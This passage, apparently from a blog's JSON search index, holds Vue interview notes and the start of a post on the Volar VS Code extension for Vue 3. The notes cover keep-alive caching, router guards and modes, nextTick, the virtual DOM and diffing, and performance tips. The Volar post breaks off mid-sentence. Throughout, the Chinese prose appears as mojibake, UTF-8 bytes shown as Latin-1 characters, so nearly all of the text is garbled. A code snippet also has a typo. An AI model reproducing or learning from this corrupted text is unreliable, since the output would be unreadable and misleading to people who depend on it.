…æœ‰å“ªäº›å¥½è™•åŠä½œç”¨ï¼Ÿ å¯ä»¥é€šéåå­—æ‰¾åˆ°å°æ‡‰çš„çµ„ä»¶ï¼ˆéæ­¸çµ„ä»¶ï¼‰ å¯ä»¥é€šénameå±¬æ€§å¯¦ç¾ç·©å­˜åŠŸèƒ½ (keep-alive) å¯ä»¥é€šénameä¾†è­˜åˆ¥çµ„ä»¶ï¼ˆè·¨ç´šçµ„ä»¶é€šä¿¡æ™‚éå¸¸é‡è¦ï¼‰ 1 2 3 4 5 Vue.extend = function () { if(name) { Sub.options.componentd[name] = Sub } } keep-aliveå¹³æ™‚åœ¨å“ªè£¡ä½¿ç”¨ï¼ŸåŸç†æ˜¯ï¼Ÿ keep-alive ä¸»è¦æ˜¯çµ„ä»¶ç·©å­˜ï¼Œæ¡ç”¨çš„æ˜¯LRUç®—æ³•ã€‚æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨æ³•ã€‚ å¸¸ç”¨çš„å…©å€‹å±¬æ€§include/excludeï¼Œå…è¨±çµ„ä»¶æœ‰æ¢ä»¶çš„é€²è¡Œç·©å­˜ã€‚ å…©å€‹ç”Ÿå‘½é€±æœŸactivated/deactivatedï¼Œç”¨ä¾†å¾—çŸ¥ç•¶å‰çµ„ä»¶æ˜¯å¦è™•æ–¼æ´»èºç‹€æ…‹ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 abstract: true, // æŠ½è±¡çµ„ä»¶ props:{ include: patternTypes, // è¦ç·©å­˜çš„æœ‰å“ªäº› exclude: patternTypes, // è¦æ’é™¤çš„æœ‰å“ªäº› max: [String, Number] //æœ€å¤§ç·©å­˜æ•¸é‡ } if(cache[key]) { // é€šékey æ‰¾åˆ°ç·©å­˜ï¼Œç²å–å¯¦ä¾‹ vnode.componentInstance = cache[key].componentInstance remove(keys, key) //å°‡keyåˆªé™¤æ‰ keys.push(key) // æ”¾åˆ°æœ«å°¾ } else { cache[key] = vnode // æ²’æœ‰ç·©å­˜é keys.push(key) //å­˜å„²key if(this.max \u0026amp;\u0026amp; keys.length \u0026gt; parseInt(this.max)) { // å¦‚æœè¶…éæœ€å¤§ç·©å­˜æ•¸ // åˆªé™¤æœ€æ—©ç·©å­˜çš„ pruneCacheEntry(cache, keys[0], keys, this._vnode) } } vnode.data.keepAlive = true // æ¨™è¨˜èµ°äº†ç·©å­˜ Vue.minxinçš„ä½¿ç”¨å ´æ™¯å’ŒåŸç†ï¼Ÿ Vue.mixinçš„ä½œç”¨å°±æ˜¯æŠ½é›¢å…¬å…±çš„æ¥­å‹™é‚è¼¯ï¼ŒåŸç†é¡ä¼¼\u0026quot;å°è±¡çš„ç¹¼æ‰¿\u0026quot;ï¼Œç•¶çµ„ä»¶åˆå§‹åŒ–æ™‚æœƒèª¿ç”¨ mergeOptionsæ–¹æ³•é€²è¡Œåˆä½µï¼Œæ¡ç”¨ç­–ç•¥æ¨¡å¼é‡å°ä¸åŒçš„å±¬æ€§é€²è¡Œåˆä½µï¼Œå¦‚æœæ··å…¥çš„æ•¸æ“šå’Œæœ¬èº«çµ„ä»¶ä¸­çš„æ•¸æ“šè¡çªï¼Œæœƒæ¡ç”¨\u0026quot;å°±è¿‘åŸå‰‡\u0026quot;ä»¥çµ„ä»¶çš„æ•¸æ“šç‚ºæº–ã€‚ è£œå……ï¼š\nmixinä¸­æœ‰å¾ˆå¤šç¼ºé™·\u0026quot;å‘½åè¡çªå•é¡Œ\u0026quot;ã€\u0026ldquo;ä¾è³´å•é¡Œ\u0026rdquo;ã€\u0026ldquo;æ•¸æ“šä¾†æºå•é¡Œ\u0026rdquo;ï¼Œé€™è£¡å¼·èª¿ä¸€ä¸‹mixinçš„æ•¸æ“šæ˜¯ä¸æœƒè¢«å…±äº«çš„ã€‚\nè·¯ç”±ç¯‡ Vue-routeræœ‰å¹¾ç¨®é‰¤å­å‡½æ•¸ï¼Ÿå…·é«”æ˜¯ä»€éº¼åŠåŸ·è¡Œæµç¨‹æ˜¯æ€æ¨£çš„ï¼Ÿ è·¯ç”±é‰¤å­çš„åŸ·è¡Œæµç¨‹ï¼Œé‰¤å­å‡½æ•¸ç¨®é¡æœ‰ï¼šå…¨å±€å®ˆè¡›ã€è·¯ç”±å®ˆè¡›ã€çµ„ä»¶å®ˆè¡›ã€‚ å®Œæ•´çš„å°èˆªè§£ææµç¨‹ å°èˆªè¢«è§¸ç™¼ åœ¨å¤±æ´»çš„çµ„ä»¶è£¡èª¿ç”¨beforeRouteLeaveå®ˆè¡› èª¿ç”¨å…¨å±€beforeEachå®ˆè¡› åœ¨å¾©ç”¨çµ„ä»¶è£¡èª¿ç”¨beforeRouteUpdateå®ˆè¡› èª¿ç”¨è·¯ç”±é…ç½®è£¡çš„beforeEnterå®ˆè¡› è§£æç•°æ­¥è·¯ç”±çµ„ä»¶ åœ¨è¢«æ¿€æ´»çš„çµ„ä»¶è£¡èª¿ç”¨beforeRouteEnterå®ˆè¡› èª¿ç”¨å…¨å±€beforeResolveå®ˆè¡› å°èˆªè¢«ç¢ºèª èª¿ç”¨å…¨å±€çš„afterEaché‰¤å­ DOMæ›´æ–° ç”¨å‰µå»ºå¥½çš„å¯¦ä¾‹èª¿ç”¨beforeRouteEnterå®ˆè¡›ä¸­å‚³çµ¦nextçš„å›èª¿å‡½æ•¸ vue-router å…©ç¨®æ¨¡å¼çš„å€åˆ¥ï¼Ÿ vue-router æœ‰ 3 ç¨®è·¯ç”±æ¨¡å¼ï¼šhashã€historyã€abstractã€‚ hashæ¨¡å¼ï¼šhash + hashChange\nç‰¹é»ï¼šhashé›–ç„¶åœ¨URLä¸­ï¼Œä½†ä¸è¢«åŒ…æ‹¬åœ¨HTTPè«‹æ±‚ä¸­ï¼›ç”¨ä¾†æŒ‡å°ç€è¦½å™¨å‹•ä½œï¼Œå°æœå‹™ç«¯å®‰å…¨ç„¡ç”¨ï¼Œhashä¸æœƒé‡åŠ è¼‰é é¢ã€‚é€šéç›£è½ hashï¼ˆ#ï¼‰çš„è®ŠåŒ–ä¾†åŸ·è¡Œjsä»£ç¢¼ å¾è€Œå¯¦ç¾ é é¢çš„æ”¹è®Šã€‚\næ ¸å¿ƒä»£ç ï¼š\n1 2 3 window.addEventListener(â€˜hashchangeâ€˜,function(){ self.urlChange() }) historyæ¨¡å¼ï¼šhistoryApi + popState\nHTML5æ¨å‡ºçš„history APIï¼Œç”±pushState()è¨˜éŒ„æ“ä½œæ­·å²ï¼Œç›£è½popstateäº‹ä»¶ä¾†ç›£è½åˆ°ç‹€æ…‹è®Šæ›´ã€‚\nå› ç‚ºåªè¦åˆ·æ–°é€™å€‹url(www.ff.ff/jjkj/fdfd/fdf/fd)å°±æœƒè«‹æ±‚æœå‹™å™¨ï¼Œç„¶è€Œæœå‹™å™¨ä¸Šæ ¹æœ¬æ²’æœ‰é€™å€‹è³‡æºï¼Œæ‰€ä»¥å°±æœƒå ±404ï¼Œè§£æ±ºæ–¹æ¡ˆå°±é…ç½®ä¸€ä¸‹æœå‹™å™¨ç«¯ã€‚\nèªªæ˜ï¼š\n1. hash: ä½¿ç”¨ URL hash å€¼ä¾†ä½œè·¯ç”±ã€‚æ”¯æŒæ‰€æœ‰ç€è¦½å™¨ï¼ŒåŒ…æ‹¬ä¸æ”¯æŒ HTML5 History Api çš„ç€è¦½å™¨\n2. history : ä¾è³´ HTML5 History API å’Œæœå‹™å™¨é…ç½®ã€‚å…·é«”å¯ä»¥æŸ¥çœ‹ HTML5 History æ¨¡å¼\n3. abstract : æ”¯æŒæ‰€æœ‰ JavaScript é‹è¡Œç’°å¢ƒï¼Œå¦‚ Node.js æœå‹™å™¨ç«¯ã€‚å¦‚æœç™¼ç¾æ²’æœ‰ç€è¦½å™¨çš„ APIï¼Œè·¯ç”±æœƒè‡ªå‹•å¼·åˆ¶é€²å…¥é€™å€‹æ¨¡å¼\nå±¬æ€§ä½œç”¨èˆ‡å°æ¯”ç¯‡ nextTickåœ¨å“ªè£¡ä½¿ç”¨ï¼ŸåŸç†æ˜¯ï¼Ÿ nextTickçš„å›èª¿æ˜¯åœ¨ä¸‹æ¬¡DOMæ›´æ–°å¾ªç’°çµæŸä¹‹å¾ŒåŸ·è¡Œçš„å»¶é²å›èª¿ã€‚åœ¨ä¿®æ”¹æ•¸æ“šä¹‹å¾Œç«‹å³ä½¿ç”¨é€™å€‹æ–¹æ³•ï¼Œç²å–æ›´æ–°å¾Œçš„DOMã€‚ nextTickä¸»è¦ä½¿ç”¨äº†å®ä»»å‹™å’Œå¾®ä»»å‹™ã€‚åŸç†å°±æ˜¯ç•°æ­¥æ–¹æ³•(promise, mutationObserver, setImmediate, setTimeout)ç¶“å¸¸èˆ‡äº‹ä»¶å¾ªç’°ä¸€èµ·ä¾†å•ã€‚ è£œå……ï¼š\nvueå¤šæ¬¡æ›´æ–°æ•¸æ“šï¼Œæœ€çµ‚æœƒé€²è¡Œæ‰¹è™•ç†æ›´æ–°ã€‚å…§éƒ¨èª¿ç”¨çš„å°±æ˜¯nextTickå¯¦ç¾äº†å»¶é²æ›´æ–°ï¼Œç”¨æˆ¶è‡ªå®šç¾©çš„nextTickä¸­çš„å›èª¿æœƒè¢«å»¶é²åˆ°æ›´æ–°å®Œæˆå¾Œèª¿ç”¨ï¼Œå¾è€Œå¯ä»¥ç²å–æ›´æ–°å¾Œçš„DOMã€‚\nVue ç‚ºä»€éº¼éœ€è¦è™›æ“¬DOMï¼Ÿè™›æ“¬DOMçš„å„ªåŠ£å¦‚ä½•ï¼Ÿ Virtual DOM å°±æ˜¯ç”¨jså°è±¡ä¾†æè¿°çœŸå¯¦DOMï¼Œæ˜¯å°çœŸå¯¦DOMçš„æŠ½è±¡ï¼Œç”±æ–¼ç›´æ¥æ“ä½œDOMæ€§èƒ½ä½ä½†æ˜¯jså±¤çš„æ“ä½œæ•ˆç‡é«˜ï¼Œå¯ä»¥å°‡DOMæ“ä½œè½‰åŒ–æˆå°åƒæ“ä½œï¼Œæœ€çµ‚é€šédiffç®—æ³•æ¯”å°å·®ç•°é€²è¡Œæ›´æ–°DOM(æ¸›å°‘äº†å°çœŸå¯¦DOMçš„æ“ä½œ)ã€‚è™›æ“¬DOMä¸ä¾è³´çœŸå¯¦å¹³å°ç’°å¢ƒå¾è€Œä¹Ÿå¯ä»¥å¯¦ç¾è·¨å¹³å°ã€‚ è£œå……ï¼š\nè™›æ“¬DOMçš„å¯¦ç¾å°±æ˜¯æ™®é€šå°è±¡åŒ…å«tagã€dataã€childrenç­‰å±¬æ€§å°çœŸå¯¦ç¯€é»çš„æè¿°ã€‚(æœ¬è³ªä¸Šå°±æ˜¯åœ¨JSå’ŒDOMä¹‹é–“çš„ä¸€å€‹ç·©å­˜)\nVue2çš„ Virtual DOM å€Ÿé‘’äº†é–‹æºåº«snabbdomçš„å¯¦ç¾ã€‚\nVirtualDOMæ˜ å°„åˆ°çœŸå¯¦DOMè¦ç¶“æ­·VNodeçš„createã€diffã€patchç­‰éšæ®µã€‚\nVueä¸­keyçš„ä½œç”¨å’Œå·¥ä½œåŸç†ï¼Œèªªèªªä½ å°å®ƒçš„ç†è§£ ä¾‹å¦‚ï¼š 1 v-for=\u0026#34;(item, itemIndex) in tabs\u0026#34; :key=\u0026#34;itemIndex\u0026#34; keyçš„ä½œç”¨ä¸»è¦æ˜¯ç‚ºäº†é«˜æ•ˆçš„æ›´æ–°è™›æ“¬DOMï¼Œå…¶åŸç†æ˜¯vueåœ¨patchéç¨‹ä¸­é€šékeyå¯ä»¥ç²¾æº–åˆ¤æ–·å…©å€‹ç¯€é»æ˜¯å¦æ˜¯åŒä¸€å€‹ï¼Œå¾è€Œé¿å…é »ç¹æ›´æ–°ä¸åŒå…ƒç´ ï¼Œä½¿å¾—æ•´å€‹patchéç¨‹æ›´åŠ é«˜æ•ˆï¼Œæ¸›å°‘DOMæ“ä½œé‡ï¼Œæé«˜æ€§èƒ½ã€‚ è£œå……ï¼š\nè‹¥ä¸è¨­ç½®keyé‚„å¯èƒ½åœ¨åˆ—è¡¨æ›´æ–°æ™‚å¼•ç™¼ä¸€äº›éš±è”½çš„bug vueä¸­åœ¨ä½¿ç”¨ç›¸åŒæ¨™ç±¤åå…ƒç´ çš„éæ¸¡åˆ‡æ›æ™‚ï¼Œä¹Ÿæœƒä½¿ç”¨åˆ°keyå±¬æ€§ï¼Œå…¶ç›®çš„ä¹Ÿæ˜¯ç‚ºäº†è®“vueå¯ä»¥å€åˆ†å®ƒå€‘ï¼Œå¦å‰‡vueåªæœƒæ›¿æ›å…¶å…§éƒ¨å±¬æ€§è€Œä¸æœƒè§¸ç™¼éæ¸¡æ•ˆæœ Vue ä¸­çš„diffåŸç† vueçš„diffç®—æ³•æ˜¯å¹³ç´šæ¯”è¼ƒï¼Œä¸è€ƒæ…®è·¨ç´šæ¯”è¼ƒçš„æƒ…æ³ã€‚å…§éƒ¨æ¡ç”¨æ·±åº¦éæ­¸çš„æ–¹å¼ + é›™æŒ‡é‡çš„æ–¹å¼é€²è¡Œæ¯”è¼ƒã€‚ è£œå……ï¼š\nå…ˆæ¯”è¼ƒæ˜¯å¦æ˜¯ç›¸åŒç¯€é» ç›¸åŒç¯€é»æ¯”è¼ƒå±¬æ€§ï¼Œä¸¦è¤‡ç”¨è€ç¯€é» æ¯”è¼ƒå…’å­ç¯€é»ï¼Œè€ƒæ…®è€ç¯€é»å’Œæ–°ç¯€é»å…’å­çš„æƒ…æ³ å„ªåŒ–æ¯”è¼ƒï¼šé ­é ­ã€å°¾å°¾ã€é ­å°¾ã€å°¾é ­ æ¯”å°æŸ¥æ‰¾é€²è¡Œè¤‡ç”¨ Vue2 èˆ‡ Vue3.x çš„diffç®—æ³•ï¼š Vue2çš„æ ¸å¿ƒDiffç®—æ³•æ¡ç”¨äº†é›™ç«¯æ¯”è¼ƒçš„ç®—æ³•ï¼ŒåŒæ™‚å¾æ–°èˆŠchildrençš„å…©ç«¯é–‹å§‹é€²è¡Œæ¯”è¼ƒï¼Œå€ŸåŠ©keyå€¼æ‰¾åˆ°å¯è¤‡ç”¨çš„ç¯€é»ï¼Œå†é€²è¡Œç›¸é—œæ“ä½œã€‚ Vue3.xå€Ÿé‘’äº†iviç®—æ³•å’Œ infernoç®—æ³•ï¼Œè©²ç®—æ³•ä¸­é‚„é‹ç”¨äº†å‹•æ…‹è¦åŠƒçš„æ€æƒ³æ±‚è§£æœ€é•·éæ­¸å­åºåˆ—ã€‚ (å¯¦éš›çš„å¯¦ç¾å¯ä»¥çµåˆVue3.xæºç¢¼çœ‹ã€‚) v-if èˆ‡ v-forçš„å„ªå…ˆç´š v-forå„ªå…ˆæ–¼v-ifè¢«è§£æ å¦‚æœåŒæ™‚å‡ºç¾ï¼Œæ¯æ¬¡æ¸²æŸ“éƒ½æœƒå…ˆåŸ·è¡Œå¾ªç’°å†åˆ¤æ–·æ¢ä»¶ï¼Œç„¡è«–å¦‚ä½•å¾ªç’°éƒ½ä¸å¯é¿å…ï¼Œæµªè²»äº†æ€§èƒ½ è¦é¿å…å‡ºç¾é€™ç¨®æƒ…æ³ï¼Œå‰‡åœ¨å¤–å±¤åµŒå¥—templateï¼Œåœ¨é€™ä¸€å±¤é€²è¡Œv-ifåˆ¤æ–·ï¼Œç„¶å¾Œåœ¨å…§éƒ¨é€²è¡Œv-forå¾ªç’° å¦‚æœæ¢ä»¶å‡ºç¾åœ¨å¾ªç’°å…§éƒ¨ï¼Œå¯é€šéè¨ˆç®—å±¬æ€§æå‰éæ¿¾æ‰é‚£äº›ä¸éœ€è¦é¡¯ç¤ºçš„é … v-ifèˆ‡v-showçš„å€åˆ¥ v-if æ˜¯çœŸæ­£çš„æ¢ä»¶æ¸²æŸ“ï¼Œç›´åˆ°æ¢ä»¶ç¬¬ä¸€æ¬¡è®Šç‚ºçœŸæ™‚ï¼Œæ‰æœƒé–‹å§‹æ¸²æŸ“ã€‚ v-show ä¸ç®¡åˆå§‹æ¢ä»¶æ˜¯ä»€éº¼æœƒæ¸²æŸ“ï¼Œä¸¦ä¸”åªæ˜¯ç°¡å–®åœ°åŸºæ–¼ CSS çš„ â€œdisplayâ€ å±¬æ€§é€²è¡Œåˆ‡æ›ã€‚ æ³¨æ„ï¼šv-if é©ç”¨æ–¼ä¸éœ€è¦é »ç¹åˆ‡æ›æ¢ä»¶çš„å ´æ™¯ï¼›v-show å‰‡é©ç”¨æ–¼éœ€è¦éå¸¸é »ç¹åˆ‡æ›æ¢ä»¶çš„å ´æ™¯ã€‚\ncomputed å’Œ watch çš„å€åˆ¥å’Œé‹ç”¨çš„å ´æ™¯ï¼Ÿ computedï¼š è¨ˆç®—å±¬æ€§ã€‚ä¾è³´å…¶å®ƒå±¬æ€§å€¼ï¼Œä¸¦ä¸” computed çš„å€¼æœ‰ç·©å­˜ï¼Œåªæœ‰å®ƒä¾è³´çš„å±¬æ€§å€¼ç™¼ç”Ÿæ”¹è®Šï¼Œä¸‹ä¸€æ¬¡ç²å– computed çš„å€¼æ™‚æ‰æœƒé‡æ–°è¨ˆç®— computed çš„å€¼ watchï¼š ç›£è½æ•¸æ“šçš„è®ŠåŒ–ã€‚æ›´å¤šçš„æ˜¯ã€Œè§€å¯Ÿã€çš„ä½œç”¨ï¼Œé¡ä¼¼æ–¼æŸäº›æ•¸æ“šçš„ç›£è½å›èª¿ ï¼Œæ¯ç•¶ç›£è½çš„æ•¸æ“šè®ŠåŒ–æ™‚éƒ½æœƒåŸ·è¡Œå›èª¿é€²è¡Œå¾ŒçºŒæ“ä½œ é‹ç”¨å ´æ™¯ï¼š ç•¶æˆ‘å€‘éœ€è¦é€²è¡Œæ•¸å€¼è¨ˆç®—ï¼Œä¸¦ä¸”ä¾è³´æ–¼å…¶å®ƒæ•¸æ“šæ™‚ï¼Œæ‡‰è©²ä½¿ç”¨ computedï¼Œå› ç‚ºå¯ä»¥åˆ©ç”¨ computed çš„ç·©å­˜ç‰¹æ€§ï¼Œé¿å…æ¯æ¬¡ç²å–å€¼æ™‚ï¼Œéƒ½è¦é‡æ–°è¨ˆç®—ã€‚ ç•¶æˆ‘å€‘éœ€è¦åœ¨æ•¸æ“šè®ŠåŒ–æ™‚åŸ·è¡Œç•°æ­¥æˆ–é–‹éŠ·è¼ƒå¤§çš„æ“ä½œæ™‚ï¼Œæ‡‰è©²ä½¿ç”¨ watchï¼Œä½¿ç”¨ watch é¸é …å…è¨±æˆ‘å€‘åŸ·è¡Œç•°æ­¥æ“ä½œ ( è¨ªå•ä¸€å€‹ API )ï¼Œé™åˆ¶æˆ‘å€‘åŸ·è¡Œè©²æ“ä½œçš„é »ç‡ï¼Œä¸¦åœ¨æˆ‘å€‘å¾—åˆ°æœ€çµ‚çµæœå‰ï¼Œè¨­ç½®ä¸­é–“ç‹€æ…‹ã€‚é€™äº›éƒ½æ˜¯è¨ˆç®—å±¬æ€§ç„¡æ³•åšåˆ°çš„ã€‚ å¦‚ä½•ç†è§£è‡ªå®šç¾©æŒ‡ä»¤ï¼Ÿ æŒ‡ä»¤çš„å¯¦ç¾åŸç†ï¼Œå¯ä»¥å¾ç·¨è­¯åŸç† â¡ ä»£ç¢¼ç”Ÿæˆ â¡ æŒ‡ä»¤é‰¤å­å¯¦ç¾é€²è¡Œæ¦‚è¿° åœ¨ç”Ÿæˆ ast èªæ³•æ¨¹æ™‚ï¼Œé‡åˆ°æŒ‡ä»¤æœƒçµ¦ç•¶å‰å…ƒç´ æ·»åŠ directiveså±¬æ€§ é€šé genDirectives ç”ŸæˆæŒ‡ä»¤ä»£ç¢¼ åœ¨patchå‰å°‡æŒ‡ä»¤çš„é‰¤å­æå–åˆ° cbsä¸­ï¼Œåœ¨patchéç¨‹ä¸­èª¿ç”¨å°æ‡‰çš„é‰¤å­ ç•¶åŸ·è¡ŒæŒ‡ä»¤å°æ‡‰é‰¤å­å‡½æ•¸æ™‚ï¼Œèª¿ç”¨å°æ‡‰æŒ‡ä»¤å®šç¾©çš„æ–¹æ³• v-modelçš„åŸç†æ˜¯ä»€éº¼ï¼Ÿ v-modelæœ¬è³ªå°±æ˜¯ä¸€å€‹èªæ³•ç³–ï¼Œå¯ä»¥çœ‹æˆæ˜¯value + inputæ–¹æ³•çš„èªæ³•ç³–ã€‚å¯ä»¥é€šémodelå±¬æ€§çš„propå’Œeventå±¬æ€§ä¾†é€²è¡Œè‡ªå®šç¾©ã€‚åŸç”Ÿçš„v-modelï¼Œæœƒæ ¹æ“šæ¨™ç±¤çš„ä¸åŒç”Ÿæˆä¸åŒçš„äº‹ä»¶å’Œå±¬æ€§ã€‚ v-model åœ¨å…§éƒ¨ç‚ºä¸åŒçš„è¼¸å…¥å…ƒç´ ä½¿ç”¨ä¸åŒçš„å±¬æ€§ä¸¦æ‹‹å‡ºä¸åŒçš„äº‹ä»¶ï¼š text å’Œ textarea å…ƒç´ ä½¿ç”¨ value å±¬æ€§å’Œ input äº‹ä»¶ã€‚ checkbox å’Œ radio ä½¿ç”¨ checked å±¬æ€§å’Œ change äº‹ä»¶ã€‚ select å­—æ®µå°‡ value ä½œç‚º prop ä¸¦å°‡ change ä½œç‚ºäº‹ä»¶ã€‚ æ€§èƒ½å„ªåŒ–ç¯‡ Vueæ€§èƒ½å„ªåŒ– - ç·¨ç¢¼éšæ®µ ç›¡é‡æ¸›å°‘dataä¸­çš„æ•¸æ“šï¼Œdataä¸­çš„æ•¸æ“šéƒ½æœƒå¢åŠ getterå’Œsetterï¼Œæœƒæ”¶é›†å°æ‡‰çš„watcher å¦‚æœéœ€è¦ä½¿ç”¨v-forçµ¦æ¯é …å…ƒç´ ç¶å®šäº‹ä»¶æ™‚ä½¿ç”¨äº‹ä»¶ä»£ç† SPA é é¢æ¡ç”¨keep-aliveç·©å­˜çµ„ä»¶ åœ¨æ›´å¤šçš„æƒ…æ³ä¸‹ï¼Œä½¿ç”¨v-ifæ›¿ä»£v-show keyä¿è­‰å”¯ä¸€ ä½¿ç”¨è·¯ç”±æ‡¶åŠ è¼‰ã€ç•°æ­¥çµ„ä»¶ é˜²æŠ–ã€ç¯€æµ ç¬¬ä¸‰æ–¹æ¨¡å¡ŠæŒ‰éœ€å°å…¥ é•·åˆ—è¡¨æ»¾å‹•åˆ°å¯è¦–å€åŸŸå‹•æ…‹åŠ è¼‰ åœ–ç‰‡æ‡¶åŠ è¼‰ Vueæ€§èƒ½å„ªåŒ– - ç”¨æˆ¶é«”é©— éª¨æ¶å± PWA ä½¿ç”¨ç·©å­˜(å®¢æˆ¶ç«¯ç·©å­˜ã€æœå‹™ç«¯ç·©å­˜)å„ªåŒ–ã€æœå‹™ç«¯é–‹å•Ÿgzipå£“ç¸®ç­‰ Vueæ€§èƒ½å„ªåŒ– - SEOå„ªåŒ– é æ¸²æŸ“ æœå‹™ç«¯æ¸²æŸ“SSR Vueæ€§èƒ½å„ªåŒ– - æ‰“åŒ…å„ªåŒ– å£“ç¸®ä»£ç¢¼ Tree Shaking/Scope Hoisting ä½¿ç”¨cdnåŠ è¼‰ç¬¬ä¸‰æ–¹æ¨¡å¡Š å¤šç·šç¨‹æ‰“åŒ…happypack splitChunksæŠ½é›¢å…¬å…±æ–‡ä»¶ sourceMapå„ªåŒ– ","date":"2022-08-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52282698225_df2b066743_o.jpg","permalink":"https://wayneblog.ga/2022-08-12/vue-interview-note/","title":"Vue åŸºæœ¬æ¦‚å¿µèˆ‡å¸¸è¦‹é¢è©¦é¡Œç­†è¨˜"},{"content":" æœ¬æ–‡é©åˆ Vue3 åˆå­¸è€…ï¼Œæˆ–è€… Vue2 é·ç§»è€…ï¼Œç•¶ç„¶é‚„æ˜¯å»ºè­° Vue3 å®˜ç¶²å®Œå…¨éä¸€éã€‚\nå…ˆæ¨è–¦å…©å€‹ vscode å¤–æ› Volar é¦–å…ˆæ¨è–¦ Volar ï¼Œä½¿ç”¨ vscode é–‹ç™¼ Vue å°ˆæ¡ˆçš„å°å¤¥ä¼´è‚¯å®šéƒ½èªè­˜ Vetur é€™å€‹ç¥ç´šå¤–æ›ï¼Œæœ‰äº†å®ƒå¯ä»¥è®“æˆ‘å€‘å¾—é–‹ç™¼å¦‚é­šå¾—æ°´ã€‚ é‚£éº¼ Volar å¯ä»¥ç†è§£ç‚º Vue3 ç‰ˆæœ¬çš„ Vetur ï¼Œç¨‹å¼ç¢¼é«˜äº®ï¼Œèªæ³•æç¤ºï¼ŒåŸºæœ¬ä¸Š Vetur æœ‰çš„å®ƒéƒ½æœ‰ã€‚\nåŠŸèƒ½ä¸€ï¼šå¤šå€‹æ ¹ç¯€é»ç·¨è­¯å™¨ä¸æœƒå ±éŒ¯ Vue3 æ˜¯å…è¨±æˆ‘å€‘æœ‰å¤šå€‹æ ¹ç¯€é»çš„ï¼Œä½†æ˜¯æˆ‘å€‘å¦‚æœä½¿ç”¨ Vetur å°±æœƒå ±éŒ¯ï¼Œä¸æœƒå½±éŸ¿åŸ·è¡Œï¼Œä½†æ˜¯çœ‹èµ·ä¾†å°±å¾ˆç…©ã€‚æ‰€ä»¥ç•¶æˆ‘å€‘è½‰å‘ Volarï¼Œé‚£éº¼å°±ä¸æœƒå‡ºç¾é€™å€‹å•é¡Œäº†ã€‚\nåŠŸèƒ½äºŒï¼šç·¨è¼¯å™¨åˆ†éš” å³ä¾¿ Vue çš„å…ƒä»¶åŒ–é–‹ç™¼ï¼Œå¯ä»¥å°‡å–®æª”æ¡ˆçš„ç¨‹å¼ç¢¼é•·åº¦å¤§å¹…ç¸®çŸ­ï¼Œä½†é‚„æ˜¯å‹•è¼’å¹¾ç™¾è¡Œç”šæ˜¯ä¸Šåƒè¡Œã€‚é‚£éº¼æˆ‘å€‘åˆ‡æ› templateã€scriptã€style çš„æ™‚å€™å°±è¦é »ç¹ä¸Šä¸‹ç¿»ï¼Œé›–ç„¶æœ‰çš„å¤–æ›å¯ä»¥ç›´æ¥å®šä½åˆ° cssï¼Œä½†æ˜¯ä½ å›ä¸å»å•Šï¼æ‰€ä»¥é€™å€‹åŠŸèƒ½ç°¡ç›´æ˜¯å¤ªäººæ€§åŒ–äº†ã€‚\nå®‰è£å®Œ Volar ä»¥å¾Œï¼Œé–‹å•Ÿä¸€å€‹ .vue æª”æ¡ˆï¼Œçœ‹ vscode çš„å³ä¸Šè§’ï¼Œæœ‰é€™éº¼ä¸€å€‹åœ–ç¤ºï¼Œé»ä¸€ä¸‹ã€‚\nå®ƒå°±æœƒè‡ªå‹•çµ¦ä½ åˆ†éš”æˆä¸‰å€‹é é¢ï¼Œåˆ†åˆ¥å°æ‡‰ templateã€scriptã€styleï¼Œé€™æ¨£å°±å¤ªèˆ’æœäº†æœ‰æ²’æœ‰ã€‚\né‚„æœ‰å¾ˆå¤šæ–°åŠŸèƒ½ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢é€™ç¯‡æ–‡ç« ï¼š\nVolar - vueçµ‚æ¥µé–‹ç™¼ç¥å™¨ï¼\nåŠŸèƒ½ä¸‰ï¼šref sugar èªæ³•å¿«æ·æ”¹å‹•æ”¯æŒ ref sugar æ˜¯ä¸€å€‹é‚„åœ¨ rfc éšæ®µçš„åŠŸèƒ½ï¼Œä½†æ˜¯å·²ç¶“æŒçºŒå¾ˆä¹…äº†ï¼Œç¾åœ¨çš„ vue3 ç‰ˆæœ¬å·²ç¶“å¯ä»¥åšé®®ä½¿ç”¨äº†ã€‚å…·é«”çš„ç”¨æ³•ä»¥åŠèªæ³•æˆ‘å°±ä¸å±•é–‹è´…è¿°äº†ï¼Œæˆ‘ä¸»è¦èªªä¸€ä¸‹ Volar å’Œ ref sugar çš„çµåˆã€‚\nå ±éŒ¯å…ˆä¸ç®¡ï¼Œæ˜¯ eslint-plugin-vue çš„åŸå› ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä½¿ç”¨äº† ref sugar ä¹‹å¾Œï¼Œscript ä¸Šé¢å‡ºç¾äº†ä¸€å€‹ ref sugar çš„å°åœ–æ¨™ï¼Œä¸¦ä¸”æ‰“äº†å€‹å°å‹¾ï¼Œé‚£éº¼æˆ‘å€‘é»ä¸€ä¸‹é‚£å€‹å°å‹¾ï¼Œçœ‹çœ‹æœƒç™¼ç”Ÿä»€éº¼ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘å€‘é»æ“Šé€™å€‹å°å°å‹¾ä¹‹å¾Œï¼Œå®ƒç”±åŸæœ¬çš„ ref sugar èªæ³•è®Šç‚ºäº†æ™®é€šçš„ script setup æ¨¡å¼ï¼Œé©šä¸é©šå–œï¼Œæ„ä¸æ„å¤–ã€‚\nåŠŸèƒ½å››ï¼šstyle è£¡é¢çš„ class å¼•ç”¨ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ .foo é€™å€‹é¡åä¸Šé¢ï¼Œå‡ºç¾äº†ä¸€å€‹ 1 reference çš„å°åœ–æ¨™ï¼Œä»£è¡¨è‘—ç•¶å‰ class æœ‰ä¸€æ¬¡å¼•ç”¨ï¼Œæˆ‘å€‘é»æ“Šä¸€ä¸‹é€™å€‹ 1 referenceã€‚\nå‡ºç¾äº†ä¸€å€‹å½ˆçª—ï¼Œè£¡é¢æ˜¯ç•¶å‰ class çš„å…·é«”ä½¿ç”¨ä½ç½®ã€‚\nåŠŸèƒ½äº”ï¼šclass è¿½æœ” æˆ‘å€‘å‰µå»ºä¸€å€‹ template æ ¹å…ƒç´ ï¼Œåœ¨è£¡é¢å¯«å…¥ï¼š\nsample.vue 1 2 3 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨ 